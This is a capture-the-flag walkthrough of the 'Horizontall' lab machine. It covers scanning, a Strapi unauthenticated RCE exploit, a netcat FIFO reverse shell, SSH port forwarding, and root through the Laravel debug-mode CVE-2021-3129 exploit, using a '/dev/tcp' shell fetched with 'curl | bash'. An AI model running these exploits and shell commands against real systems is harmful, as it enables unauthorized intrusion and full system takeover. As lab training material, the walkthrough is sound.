```bash
ghost@localhost [11:34:02] [~/Documents/hacking/tj-null-boxes/horizontall] [master]
-> % export IP=10.10.11.105

ghost@localhost [11:37:16] [~/Documents/hacking/tj-null-boxes/horizontall] [master]
-> % export DOMAIN=http://horizontall.htb
```

# Scan

```bash
ghost@localhost [11:35:00] [~/Documents/hacking/tj-null-boxes/horizontall] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.11.105:22
Open 10.10.11.105:80

ghost@localhost [11:36:11] [~/Documents/hacking/tj-null-boxes/horizontall] [master]
-> % nmap -sC -sV -vvv -p 22,80 $IP

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80, horizontall.htb

Website got nothing, but looking through source code found obscured JS code that contains a domain `api-prod.horizontall.htb`.

## api-prod.horizontall.htb

Running go-buster on it gives few paths.

```bash
ghost@localhost [15:04:47] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % gobuster dir -u http://api-prod.$DOMAIN -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
/admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
```

There's an exploit I found from searchsploit for unauthorized RCE (https://www.exploit-db.com/exploits/50239).

In the add, it calls `admin/init` to check the Strapi version. By checking the version, I found out that it is running `3.0.0-beta.17.4`.
http://api-prod.horizontall.htb/admin/init

With that, running the exploit will return new credentials and console for blind RCE. The following netcat command gives reverse shell back.

```bash
ghost@localhost [16:51:21] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjYzOTIzMTAzLCJleHAiOjE2NjY1MTUxMDN9.k3si1Sv7DHZiO0Y0POSd9ylquNSHylADp4qsj-BNbdQ

$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.8 4444 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

```bash
ghost@localhost [17:01:41] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.105] 51012
/bin/sh: 0: can't access tty; job control turned off
strapi@horizontall:~/myapi$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

# user.txt

```bash
strapi@horizontall:~$ ls /home/
developer

strapi@horizontall:~$ ls /home/developer
composer-setup.php
myproject
user.txt

strapi@horizontall:~$ cat /home/developer/user.txt
dcf7ae49d0ad0643785fccad6b16e712
```

## adding SSH key

I generated SSH key and add it to the target machine so I can access the machine easily.

# Privilege escalation

There's something running at port 8000.

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1882/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

## hidden process

When I call `ps -ef` I do not see service running at port 8000 because `hidepid` is set to 2. Setting that to 2 will hide other processes in the machine.

```bash
strapi@horizontall:~/myapi$ mount | grep hidepid
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=2)
```

## port forwarding

```bash
ghost@localhost [10:55:37] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % ssh -i horizontall -L 8001:127.0.0.1:8000 strapi@10.10.11.105
```

## gobuster

```bash
ghost@localhost [10:59:01] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % gobuster dir -u http://localhost:8001 -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
Progress: 46 / 43008 (0.11%)
/profiles             (Status: 500) [Size: 616206]
```

## exploit

Going to the profile will gives Laravel error in debug mode. From googling, I learnt that there's an exploit for Laravel debug mode https://github.com/nth347/CVE-2021-3129_exploit).

A better explanation can also be found here (https://www.ambionics.io/blog/laravel-debug-rce).

```bash
ghost@localhost [11:12:46] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % python3 laravel.py http://localhost:8001 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2962, done.
remote: Counting objects: 100% (508/508), done.
remote: Compressing objects: 100% (210/210), done.
remote: Total 2962 (delta 362), reused 308 (delta 283), pack-reused 2454
Receiving objects: 100% (2962/2962), 430.81 KiB | 743.00 KiB/s, done.
Resolving deltas: 100% (1234/1234), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```

The exploit works, so this time will be running for reverse shell. The following script will not works because of the bad character.

```bash
ghost@localhost [11:15:08] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % python3 laravel.py http://localhost:8001 Monolog/RCE1 "bash -C 'bash -i >& /dev/tcp/10.10.16.8/4445 0>&1'"
```

So first I create file called `root-shell` and serve with Python server.
```bash
bash -i >& /dev/tcp/10.10.16.8/4445 0>&1
```

Then run exploit as below.

```bash
ghost@localhost [11:36:45] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % python3 laravel.py http://localhost:8001 Monolog/RCE1 "curl 10.10.16.8/root-shell | bash"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[i] There is no output
[i] Trying to clear logs
```

# root.txt
```bash
ghost@localhost [11:14:10] [~/Documents/hacking/tj-null-boxes/horizontall] [master *]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.105] 49272
bash: cannot set terminal process group (104397): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# id
uid=0(root) gid=0(root) groups=0(root)

root@horizontall:/home/developer/myproject/public# cat /root/root.txt
4d7e647a6a228bf8e8faac22f53dfddf
```
